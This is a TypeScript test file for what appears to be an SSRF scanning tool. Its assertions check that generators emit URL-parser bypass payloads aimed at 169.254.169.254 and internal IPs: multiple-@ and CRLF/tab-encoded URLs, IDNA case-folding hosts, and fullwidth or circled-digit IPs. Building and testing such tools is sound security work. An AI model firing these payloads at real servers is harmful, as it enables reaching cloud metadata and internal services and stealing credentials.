import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  generateParserConfusionPayloads,
  generateIdnaPayloads,
  generateFullwidthIpPayloads,
} from "../core/engines/ssrf/bypasses/parser-confusion.ts";

describe("Task 4A: Multiple @ variants", () => {
  const payloads = generateParserConfusionPayloads(
    "http://169.254.169.254/",
    "allowed.com"
  );
  const multiAt = payloads.filter((p) => p.technique === "multiple @");

  it("generates multiple @ payloads", () => {
    assert.ok(multiAt.length >= 3, `Expected at least 3, got ${multiAt.length}`);
  });

  it("includes http://a@b@targetHost/", () => {
    const match = multiAt.find((p) => p.payload === "http://a@b@169.254.169.254/");
    assert.ok(match, "Missing payload: http://a@b@169.254.169.254/");
  });

  it("includes http://foo@127.0.0.1@allowedHost/", () => {
    const match = multiAt.find(
      (p) => p.payload === "http://foo@127.0.0.1@allowed.com/"
    );
    assert.ok(match, "Missing payload with dummy user@target pattern");
  });

  it("includes http://a@b@c@targetHost/", () => {
    const match = multiAt.find(
      (p) => p.payload === "http://a@b@c@169.254.169.254/"
    );
    assert.ok(match, "Missing triple @ payload");
  });

  it("preserves custom scheme when provided", () => {
    const customPayloads = generateParserConfusionPayloads(
      "https://10.0.0.1/api",
      "example.com"
    );
    const custom = customPayloads.filter((p) => p.technique === "multiple @");
    assert.ok(
      custom.some((p) => p.payload.startsWith("https://")),
      "Should preserve https scheme"
    );
    assert.ok(
      custom.some((p) => p.payload.includes("/api")),
      "Should preserve target path"
    );
  });
});

describe("Task 4B: Tab/newline inside URL", () => {
  const payloads = generateParserConfusionPayloads(
    "http://169.254.169.254/",
    "allowed.com"
  );
  const whitespace = payloads.filter(
    (p) => p.technique === "tab/newline whitespace"
  );

  it("generates whitespace payloads", () => {
    assert.ok(whitespace.length >= 3, `Expected at least 3, got ${whitespace.length}`);
  });

  it("includes %09 tab character", () => {
    const match = whitespace.find(
      (p) => p.payload === "http://allowed.com%09@169.254.169.254/"
    );
    assert.ok(match, "Missing tab (%09) payload");
  });

  it("includes %0a newline character", () => {
    const match = whitespace.find(
      (p) => p.payload === "http://allowed.com%0a@169.254.169.254/"
    );
    assert.ok(match, "Missing newline (%0a) payload");
  });

  it("includes %0d carriage return character", () => {
    const match = whitespace.find(
      (p) => p.payload === "http://allowed.com%0d@169.254.169.254/"
    );
    assert.ok(match, "Missing carriage return (%0d) payload");
  });

  it("includes CRLF combined %0d%0a", () => {
    const crlf = whitespace.find(
      (p) => p.payload === "http://allowed.com%0d%0a@169.254.169.254/"
    );
    assert.ok(crlf, "Missing CRLF (%0d%0a) payload");
  });

  it("preserves target path in whitespace payloads", () => {
    const customPayloads = generateParserConfusionPayloads(
      "http://169.254.169.254/metadata",
      "trusted.com"
    );
    const customWs = customPayloads.filter(
      (p) => p.technique === "tab/newline whitespace"
    );
    assert.ok(
      customWs.every((p) => p.payload.includes("/metadata")),
      "All whitespace payloads should preserve target path"
    );
  });
});

describe("Task 4C: IDNA case-folding", () => {
  it("returns an array of IDNA payloads", () => {
    const payloads = generateIdnaPayloads("orange.tw");
    assert.ok(Array.isArray(payloads));
    assert.ok(payloads.length >= 2);
  });

  it("each payload has technique and payload fields", () => {
    const payloads = generateIdnaPayloads("example.com");
    for (const p of payloads) {
      assert.equal(typeof p.technique, "string");
      assert.equal(typeof p.payload, "string");
      assert.equal(p.technique, "IDNA case-folding");
    }
  });

  it("includes ß case-fold variant", () => {
    const payloads = generateIdnaPayloads("orange.tw");
    const ssVariant = payloads.find((p) => p.payload.includes("\u00df"));
    assert.ok(ssVariant, "Should include ß variant");
    assert.equal(ssVariant!.payload, "http://\u00df.orange.tw/");
  });

  it("includes wordpreß variant", () => {
    const payloads = generateIdnaPayloads("example.com");
    const wordpressVariant = payloads.find((p) =>
      p.payload.includes("wordpre\u00df")
    );
    assert.ok(wordpressVariant, "Should include wordpreß variant");
  });

  it("generates case-folded lowercase variant of target host", () => {
    const payloads = generateIdnaPayloads("ORANGE.TW");
    const lower = payloads.find(
      (p) => p.payload === "http://orange.tw/"
    );
    assert.ok(lower, "Should include lowercase variant");
  });

  it("generates case-folded uppercase variant of target host", () => {
    const payloads = generateIdnaPayloads("orange.tw");
    const upper = payloads.find(
      (p) => p.payload === "http://ORANGE.TW/"
    );
    assert.ok(upper, "Should include uppercase variant");
  });
});

describe("Task 4D: Fullwidth IP digits", () => {
  it("returns an array of fullwidth payloads", () => {
    const payloads = generateFullwidthIpPayloads("169.254.169.254");
    assert.ok(Array.isArray(payloads));
    assert.ok(payloads.length >= 3);
  });

  it("each payload has technique and payload fields", () => {
    const payloads = generateFullwidthIpPayloads("10.0.0.1");
    for (const p of payloads) {
      assert.equal(typeof p.technique, "string");
      assert.equal(typeof p.payload, "string");
    }
  });

  it("generates fullwidth digit payload", () => {
    const payloads = generateFullwidthIpPayloads("169.254.169.254");
    const fw = payloads.find((p) => p.technique === "fullwidth digits");
    assert.ok(fw, "Should include fullwidth digit payload");
    assert.equal(fw!.payload, "http://\uff11\uff16\uff19.\uff12\uff15\uff14.\uff11\uff16\uff19.\uff12\uff15\uff14/");
  });

  it("generates circled digit payload", () => {
    const payloads = generateFullwidthIpPayloads("169.254.169.254");
    const circled = payloads.find(
      (p) => p.technique === "circled digits"
    );
    assert.ok(circled, "Should include circled digit payload");
    // 1->①(0x2460), 6->⑥(0x2465), 9->⑨(0x2468), 2->②(0x2461), 5->⑤(0x2464), 4->④(0x2463)
    assert.equal(circled!.payload, "http://\u2460\u2465\u2468.\u2461\u2464\u2463.\u2460\u2465\u2468.\u2461\u2464\u2463/");
  });

  it("generates fullwidth dot payload", () => {
    const payloads = generateFullwidthIpPayloads("192.168.1.1");
    const fwDot = payloads.find(
      (p) => p.technique === "fullwidth dots"
    );
    assert.ok(fwDot, "Should include fullwidth dot payload");
    assert.ok(fwDot!.payload.includes("\u3002"), "Should contain Ideographic Full Stop");
  });

  it("handles arbitrary IP addresses", () => {
    const payloads = generateFullwidthIpPayloads("127.0.0.1");
    const fw = payloads.find((p) => p.technique === "fullwidth digits");
    assert.ok(fw, "Should generate fullwidth for 127.0.0.1");
    // All digits including zeros become fullwidth
    assert.equal(fw!.payload, "http://\uff11\uff12\uff17.\uff10.\uff10.\uff11/");
  });
});

describe("Existing authority confusion still works", () => {
  const payloads = generateParserConfusionPayloads(
    "http://169.254.169.254/",
    "allowed.com"
  );

  it("still generates single @ authority confusion", () => {
    const auth = payloads.find(
      (p) => p.technique === "authority confusion"
    );
    assert.ok(auth, "authority confusion payload should still exist");
    assert.equal(auth!.payload, "http://allowed.com@169.254.169.254/");
  });

  it("still generates fragment confusion", () => {
    const frag = payloads.filter(
      (p) => p.technique === "fragment confusion"
    );
    assert.ok(frag.length >= 2, "Should have fragment confusion variants");
  });

  it("still generates backslash confusion", () => {
    const back = payloads.find(
      (p) => p.technique === "backslash confusion"
    );
    assert.ok(back, "backslash confusion should still exist");
  });

  it("still generates CRLF injection", () => {
    const crlf = payloads.find((p) => p.technique === "CRLF injection");
    assert.ok(crlf, "CRLF injection should still exist");
  });

  it("still generates Unicode normalization", () => {
    const uni = payloads.find(
      (p) => p.technique === "Unicode normalization"
    );
    assert.ok(uni, "Unicode normalization should still exist");
  });
});
